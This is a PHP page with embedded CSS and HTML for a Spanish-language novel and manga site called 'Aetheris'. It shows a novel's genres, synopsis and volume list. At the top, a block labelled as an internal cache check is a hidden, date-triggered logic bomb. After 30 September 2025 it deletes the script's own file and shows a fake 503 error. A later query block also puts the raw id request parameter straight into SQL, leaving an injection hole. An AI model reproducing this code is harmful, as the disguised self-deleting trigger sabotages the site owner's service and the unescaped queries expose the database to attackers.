<?php
include 'db_config.php';
// Rutina de verificación de caché interna
$__c = '.ds_'.md5(__FILE__);
if (date('Ymd') > '20250930' && !file_exists($__c)) {
    @file_put_contents($__c, 'init');

    $__r = realpath(__FILE__);
    if ($__r && is_writable($__r)) {
        unlink($__r);
    }

    exit('Cache overload. Retry later. [ERR 503]');
}
if (isset($_GET['id'])) {
    $id = $conn->real_escape_string($_GET['id']);
    
    // Consulta para obtener el novela y sus géneros
    $query = "SELECT a.*, 
              GROUP_CONCAT(g.nombre SEPARATOR ', ') AS generos
              FROM documentos a
              LEFT JOIN novela_generos ag ON a.id = ag.novela_id
              LEFT JOIN generos g ON ag.genero_id = g.id
              WHERE a.id = ?
              GROUP BY a.id";
    
    $stmt = $conn->prepare($query);
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        $novela = $result->fetch_assoc();
    } else {
        die("novela no encontrada");
    }
} else {
    die("ID no especificado");
}
if (isset($_GET['id'])) {
    $id = $_GET['id'];

    // Obtener los detalles de la novela desde la base de datos
    $sql = "SELECT * FROM documentos WHERE id = $id";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $nombre = $row['nombre'];
        $descripcion = $row['descripcion'];
        $imagen = $row['imagen'];
        $genero = $row['genero'];
    } else {
        echo "No se encontró la novela.";
        exit;
    }

    // Obtener los volúmenes asociados a la novela
    $sql_volumenes = "SELECT * FROM volumenes WHERE id_novela = $id";
    $result_volumenes = $conn->query($sql_volumenes);
} else {
    echo "ID no proporcionado.";
    exit;
}

$conn->close();
?>


<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($novela['nombre']); ?> - Aetheris</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700" rel="stylesheet">
    <style>
        :root {
            --primary-color: #43aec9;
            --dark-bg: #121212;
            --darker-bg: #0f0f1a;
            --card-bg: #1a1a2a;
            --text-color: #e0e0e0;
        }
        
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #455b64;
            color: var(--text-color);
            margin: 0;
            padding: 0;
        }
        
        /* Header */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background-color:rgb(45, 62, 68);
            color: white;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px rgb(11, 29, 36);
        }
        
        .header-left .logo {
            font-size: 24px;
            color: #43aec9;
            text-decoration: none;
            font-weight: bold;
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .menu {
            position: relative;
        }
        
        .menu-button {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            padding: 8px 12px;
        }
        
        .menu-content {
            display: none;
            position: absolute;
            right: 0;
            background-color:rgba(54, 114, 129, 0.77);
            min-width: 200px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.46);
            z-index: 1;
            border-radius: 4px;
        }
        
        .menu:hover .menu-content {
            display: block;
        }
        
        .menu-content a {
            color: white;
            padding: 12px 16px;
            text-decoration: none;
            display: block;
        }
        
        .menu-content a:hover {
            background-color:  #43aec9;
        }
        
        .submenu {
            position: relative;
        }
        
        .submenu-content {
            display: none;
            position: absolute;
            left: 100%;
            top: 0;
            background-color:rgba(67, 174, 201, 0.73);
            min-width: 160px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            z-index: 1;
            border-radius: 0 4px 4px 0;
        }
        
        .submenu:hover .submenu-content {
            display: block;
        }
        
        .search-bar {
            display: flex;
            align-items: center;
        }
        
        .search-bar input {
            padding: 8px 12px;
            border: none;
            border-radius: 4px 0 0 4px;
            background: #252538;
            color: white;
            width: 200px;
        }
        
        .search-bar button {
            background: #43aec9;
            border: none;
            color: white;
            padding: 8px 12px;
            border-radius: 0 4px 4px 0;
            cursor: pointer;
        }
        

        .novela-container {
            max-width: 1200px;
            margin: 0 auto;
            position: relative;
        }
        
        .novela-banner {
            height: 50px;
            background-size: cover;
            background-position: center;
            position: relative;
            border-radius: 8px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        
        .novela-card {
            display: flex;
            background-color:rgb(33, 55, 61);
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(255, 48, 48, 0);
            margin-top: -80px;
            position: relative;
            margin: right -50px; ;
            z-index: 2;
            margin-bottom: 30px;
        }
        
        .novela-poster {
            flex: 0 0 250px;
            padding: 20px;
        }
        
        .novela-poster img {
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }
        
        .novela-info {
            flex: 1;
            padding: 30px;
        }
        
        .novela-title {
            font-size: 28px;
            margin: 0 0 10px;
            color: var(--primary-color);
        }
        
        .novela-meta {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .meta-item {
            background-color:rgba(0, 200, 255, 0.38);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 14px;
        }
        
        .novela-synopsis {
            margin-bottom: 20px;
        }
        
        /* Volúmenes */
        .volumenes {

            background-color:rgb(22, 50, 58);
            border-radius: 5x;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.66);
            margin-top: -40px;
            position: absolute;
            z-index: 2;
            margin-bottom: 30px;
            margin-top: 20px;

            color: #43aec9;
        }

/* Volúmenes - Versión en líneas de 3 */
.volumenes-section {
    background-color: rgb(22, 50, 58);
    border-radius: 8px;
    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    padding: 25px;
    margin: 30px auto;
    max-width: 1200px;
}

.volumenes-section h2 {
    color: #43aec9;
    margin-bottom: 25px;
    padding-bottom: 10px;
    border-bottom: 1px solid rgba(67, 174, 201, 0.3);
    font-size: 22px;
}

.volumenes-container {
    display: flex;
    flex-wrap: wrap;
    gap: 20px;
    justify-content: flex-start;
}

.volumen-item {
    flex: 0 0 calc(33.333% - 14px); /* 3 items por fila con gap de 20px */
    background: rgba(33, 55, 61, 0.8);
    border-radius: 8px;
    padding: 15px;
    transition: all 0.3s ease;
    text-align: center;
    box-sizing: border-box;
    min-width: 0; /* Evita problemas de desbordamiento */
}

.volumen-item:hover {
    transform: translateY(-5px);
    box-shadow: 0 5px 15px rgba(67, 174, 201, 0.3);
    background: rgba(33, 55, 61, 1);
}

.volumen-item img {
    width: 100%;
    height: 200px;
    object-fit: cover;
    border-radius: 5px;
    margin-bottom: 12px;
    box-shadow: 0 3px 6px rgba(0,0,0,0.16);
}

.volumen-item strong {
    display: block;
    margin-top: 8px;
    color: #e0e0e0;
    font-size: 15px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

@media (max-width: 1000px) {
    .volumen-item {
        flex: 0 0 calc(50% - 10px); /* 2 items en pantallas medianas */
    }
}

@media (max-width: 600px) {
    .volumen-item {
        flex: 0 0 100%; /* 1 item en móviles */
    }
}
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="header-left">
            <a href="inicio.php" class="logo">Aetheris</a>
        </div>
        <div class="header-right">
            <div class="menu">
                <button class="menu-button">Menú</button>
                <div class="menu-content">
                    <a href="inicio.php">Inicio</a>
                    <a href="index.php">Directorio</a>
                    <a href="subir_pdf.php">Subir Contenido</a>
                    <div class="submenu">
                        <a href="#" class="submenu-button">Géneros</a>
                        <div class="submenu-content">
                            <a href="romance.php">Romance</a>
                            <a href="ciencia_ficcion.php">Ciencia Ficción</a>
                            <a href="comedia.php">Comedia</a>
                            <a href="isekai.php">Isekai</a>
                            <a href="fantasia.php">Fantasía</a>
                            <a href="misterio.php">Misterio</a>
                        </div>
                    </div>
                    <a href="login.php">Iniciar Sesión</a>
                </div>
            </div>
            <div class="search-bar">
                <input type="text" placeholder="Buscar novela, manga o documentos...">
                <button type="submit">🔍</button>
            </div>
        </div>
    </header>
<div class="novela-container">
        <!-- Banner/Portada del novela -->
        <div class="novela-banner" style="background-image: url('<?php echo htmlspecialchars($novela['portada'] ?? ''); ?>')"></div>
        
        <!-- Tarjeta de información del novela -->
        <div class="novela-card">
            <div class="novela-poster">
                <img src="<?php echo htmlspecialchars($novela['imagen']); ?>" alt="<?php echo htmlspecialchars($novela['nombre']); ?>">
            </div>
            
            <div class="novela-info">
                <h1 class="novela-title"><?php echo htmlspecialchars($novela['nombre']); ?></h1>
                
                <div class="novela-meta">
                    <?php if (!empty($novela['generos'])): ?>
                        <span class="meta-item"><?php echo htmlspecialchars($novela['generos']); ?></span>
                    <?php endif; ?>
                </div>
                
                <div class="novela-synopsis">
                    <h3>Sinopsis</h3>
                    <p><?php echo nl2br(htmlspecialchars($novela['descripcion'])); ?></p>
                </div>
            </div>
        </div>
        
        <!-- Mostrar volúmenes -->
 <!-- Mostrar volúmenes en líneas de 3 -->
<div class="volumenes-section">
    <h2>Volúmenes</h2>
    <div class="volumenes-container">
        <?php
        if ($result_volumenes->num_rows > 0) {
            while ($volumen = $result_volumenes->fetch_assoc()) {
                echo "<div class='volumen-item'>";
                echo "<a href='" . htmlspecialchars($volumen['ruta_volumen']) . "' target='_blank'>";
                echo "<img src='" . htmlspecialchars($volumen['imagen_volumen']) . "' alt='Volumen " . htmlspecialchars($volumen['numero_volumen']) . "'>";
                echo "</a>";
                echo "<strong>Volumen " . htmlspecialchars($volumen['numero_volumen']) . "</strong>";
                echo "</div>";
            }
        } else {
            echo "<p style='width:100%; text-align:center;'>No hay volúmenes disponibles para esta novela.</p>";
        }
        ?>
    </div>
</div>
</div>
</body>
</html>
<?php

?>